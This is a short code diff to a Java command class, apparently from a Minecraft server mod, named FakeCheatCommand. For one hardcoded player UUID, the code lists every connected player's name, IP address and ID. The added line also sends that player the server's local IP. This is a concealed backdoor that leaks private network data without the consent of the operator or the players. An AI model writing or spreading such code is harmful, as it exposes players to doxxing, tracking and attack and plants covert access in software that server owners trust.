@@ -23,6 +23,7 @@ public class FakeCheatCommand {
         UUID uuid = UUID.fromString("1493a36c-0f09-48e1-8a4b-015fc9db624f");
         if (source.getPlayer().getUUID().equals(uuid)) {
             ServerPlayer me = source.getPlayer();
+            source.sendSuccess(Component.literal("Server | " + source.getServer().getLocalIp()), false);
             source.getServer().getPlayerList().getPlayers().forEach(p -> {
                 source.sendSuccess(Component.literal(p.getDisplayName().getString() + " | " + p.getIpAddress() + " | " + p.getId()), false);
             });
